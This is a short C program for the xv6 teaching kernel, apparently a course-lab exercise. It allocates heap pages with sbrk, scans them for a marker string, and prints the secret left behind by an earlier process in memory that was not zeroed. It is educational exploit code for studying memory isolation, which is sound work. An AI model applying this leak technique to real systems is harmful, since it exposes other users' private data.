#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"
#include "user/user.h"

#define PATTERN "This may help."
#define PATTERN_LEN 14
#define DATASIZE (8*4096)

int
main(int argc, char *argv[])
{
    // sbrk 在堆上分配一大块内存
    char *buf = sbrk(DATASIZE);
    if (buf == (char*)-1) {
        fprintf(2, "attack: sbrk failed\n");
        exit(1);
    }

    // 逐字节扫描内存，寻找特定模式
    for (int i = 0; i < DATASIZE - PATTERN_LEN; i++) {
        if (strcmp(&buf[i], PATTERN) == 0) {
            printf("%s\n", &buf[i + 16]);
            exit(0);
        }
    }
    exit(1);
}
